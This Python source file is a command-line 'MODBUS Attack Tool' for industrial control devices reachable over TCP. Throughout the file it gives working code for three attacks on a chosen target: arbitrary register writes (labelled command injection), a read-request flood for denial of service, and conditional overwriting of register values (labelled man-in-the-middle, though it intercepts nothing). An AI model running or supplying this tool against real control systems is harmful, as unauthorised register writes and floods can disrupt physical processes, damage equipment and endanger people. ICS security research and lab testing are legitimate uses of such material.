#!/usr/bin/env python3
"""
MODBUS Command Injection Attack Module.
Implements various attack techniques against MODBUS-enabled devices.
"""

import time
import logging
import argparse
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusException

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('modbus_attacker')

class ModbusAttacker:
    """Implements various attacks against MODBUS protocol."""
    
    def __init__(self, target_ip, target_port=502):
        """Initialize the MODBUS attacker.
        
        Args:
            target_ip (str): Target device IP address
            target_port (int): Target MODBUS port (default: 502)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.client = None
        
    def connect(self):
        """Establish connection to the target device."""
        try:
            self.client = ModbusTcpClient(self.target_ip, port=self.target_port)
            connected = self.client.connect()
            if connected:
                logger.info(f"Connected to {self.target_ip}:{self.target_port}")
                return True
            else:
                logger.error(f"Failed to connect to {self.target_ip}:{self.target_port}")
                return False
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False
    
    def disconnect(self):
        """Close connection to the target device."""
        if self.client:
            self.client.close()
            logger.info(f"Disconnected from {self.target_ip}:{self.target_port}")
    
    def execute_command_injection(self, register, value):
        """Perform command injection attack on MODBUS target.
        
        Args:
            register (int): Target register address
            value (int): Malicious value to write
            
        Returns:
            bool: True if attack was successful, False otherwise
        """
        if not self.client or not self.client.is_socket_open():
            if not self.connect():
                return False
        
        logger.info(f"Executing command injection attack on register {register} with value {value}")
        try:
            # Execute malicious write to register
            result = self.client.write_register(register, value)
            if result and not result.isError():
                logger.info(f"Command injection successful - wrote {value} to register {register}")
                return True
            else:
                logger.error(f"Command injection failed: {result}")
                return False
        except ModbusException as e:
            logger.error(f"Modbus error during command injection: {e}")
            return False
        except Exception as e:
            logger.error(f"Error during command injection: {e}")
            return False
    
    def execute_dos_attack(self, duration=30):
        """Perform denial of service attack by flooding MODBUS requests.
        
        Args:
            duration (int): Attack duration in seconds
            
        Returns:
            int: Number of successful requests sent
        """
        if not self.client or not self.client.is_socket_open():
            if not self.connect():
                return 0
        
        logger.info(f"Executing DoS attack for {duration} seconds")
        start_time = time.time()
        requests_sent = 0
        
        try:
            while time.time() - start_time < duration:
                for register in range(0, 1000, 10):  # Use different registers
                    try:
                        # Flood with read requests
                        self.client.read_holding_registers(register, 10)
                        requests_sent += 1
                    except:
                        pass
        except KeyboardInterrupt:
            logger.info("DoS attack interrupted by user")
        except Exception as e:
            logger.error(f"Error during DoS attack: {e}")
        
        logger.info(f"DoS attack completed. Sent {requests_sent} requests in {time.time() - start_time:.2f} seconds")
        return requests_sent
    
    def execute_mitm_attack(self, target_register, original_value, malicious_value):
        """Perform man-in-the-middle attack by modifying legitimate values.
        
        Args:
            target_register (int): Target register to monitor and modify
            original_value (int): Value to intercept
            malicious_value (int): Value to substitute
            
        Returns:
            bool: True if attack was successful, False otherwise
        """
        if not self.client or not self.client.is_socket_open():
            if not self.connect():
                return False
                
        logger.info(f"Executing MITM attack on register {target_register}")
        
        # Monitor for the original value
        try:
            result = self.client.read_holding_registers(target_register, 1)
            if result and not result.isError():
                current_value = result.registers[0]
                logger.info(f"Current value of register {target_register} is {current_value}")
                
                if current_value == original_value:
                    # Replace with malicious value
                    write_result = self.client.write_register(target_register, malicious_value)
                    if write_result and not write_result.isError():
                        logger.info(f"MITM attack successful - replaced {original_value} with {malicious_value}")
                        return True
                    else:
                        logger.error(f"MITM attack failed during write: {write_result}")
                        return False
                else:
                    logger.info(f"MITM attack waiting - expected {original_value}, found {current_value}")
                    return False
            else:
                logger.error(f"MITM attack failed during read: {result}")
                return False
        except Exception as e:
            logger.error(f"Error during MITM attack: {e}")
            return False

# Simplified function matching README example
def execute_command_injection(target_ip, target_port, register, value):
    """Perform command injection attack on MODBUS target."""
    client = ModbusTcpClient(target_ip, port=target_port)
    client.connect()
    
    # Malicious write to register
    client.write_register(register, value)
    
    client.close()
    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MODBUS Attack Tool")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=502, help="Target MODBUS port (default: 502)")
    parser.add_argument("--attack", choices=["command_injection", "dos", "mitm"], required=True, help="Attack type")
    parser.add_argument("--register", type=int, help="Target register for command injection or MITM")
    parser.add_argument("--value", type=int, help="Malicious value for command injection")
    parser.add_argument("--duration", type=int, default=30, help="Duration for DoS attack in seconds")
    parser.add_argument("--original-value", type=int, help="Original value to intercept in MITM attack")
    parser.add_argument("--malicious-value", type=int, help="Malicious value for MITM attack")
    
    args = parser.parse_args()
    
    attacker = ModbusAttacker(args.target, args.port)
    
    try:
        if args.attack == "command_injection":
            if args.register is None or args.value is None:
                parser.error("--register and --value are required for command injection attack")
            attacker.connect()
            attacker.execute_command_injection(args.register, args.value)
        elif args.attack == "dos":
            attacker.connect()
            attacker.execute_dos_attack(args.duration)
        elif args.attack == "mitm":
            if args.register is None or args.original_value is None or args.malicious_value is None:
                parser.error("--register, --original-value, and --malicious-value are required for MITM attack")
            attacker.connect()
            attacker.execute_mitm_attack(args.register, args.original_value, args.malicious_value)
    finally:
        attacker.disconnect() 